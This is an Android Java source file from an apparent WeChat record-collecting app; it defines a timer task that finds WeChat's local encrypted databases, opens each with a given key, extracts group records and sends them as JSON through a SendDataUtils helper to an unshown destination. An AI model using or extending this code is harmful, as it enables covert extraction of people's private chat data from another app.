package com.wiwj.wxrecord;

import android.os.Handler;
import android.os.Message;

import com.google.gson.Gson;
import com.wiwj.wxrecord.domain.Qun;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.File;
import java.util.List;
import java.util.TimerTask;

/**
 * Created by zghw on 2017/11/2.
 */

public class TimerTaskNewRecord extends TimerTask {

    private String password;

    public TimerTaskNewRecord(String password) {
        this.password = password;
    }

    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            SendDataUtils.sendData(String.valueOf(msg.obj));
            super.handleMessage(msg);
        }
    };

    @Override
    public void run() {
        //  递归查询微信本地数据库文件
        List<File> wxDbFileList = WxInfo.getWxDbFileList();
        //处理多账号登陆情况
        for (int i = 0; i < wxDbFileList.size(); i++) {
            File file = wxDbFileList.get(i);
            SQLiteDatabase db = null;
            try {
                //链接数据库
                db = DataQuery.getdb(file, password);
                List<Qun> qunList = DataQuery.getResultModify(db);
                Gson gson = new Gson();
                for (Qun qun : qunList) {
                    String res = gson.toJson(qun);
                    LogUtil.d("发送的json数据为：" + res);
                    Message message = new Message();
                    message.obj = res;
                    handler.sendMessage(message);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (db != null) {
                    db.close();
                }
            }
        }

    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public Handler getHandler() {
        return handler;
    }

    public void setHandler(Handler handler) {
        this.handler = handler;
    }
}
